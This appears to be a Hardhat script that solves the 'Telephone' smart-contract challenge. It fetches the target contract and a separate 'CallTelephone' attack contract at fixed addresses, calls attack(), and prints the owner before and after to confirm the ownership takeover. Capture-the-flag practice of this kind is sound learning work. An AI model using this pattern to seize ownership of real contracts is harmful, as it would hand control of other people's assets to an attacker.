
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();

    const contract = await hre.ethers.getContractAt("Telephone", "0x17DBE2026e9B97263Bac2d20728183190ACC4eb9", deployer);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract owner:", await contract.owner());

    const attackContract = await hre.ethers.getContractAt("CallTelephone", "0xC9B44c1ECfcaF283A76dD35B45aab81FF00Da251", deployer);
    console.log("Attack contract deployed to address:", attackContract.address);    

    await attackContract.attack();

    console.log("Contract owner:", await contract.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
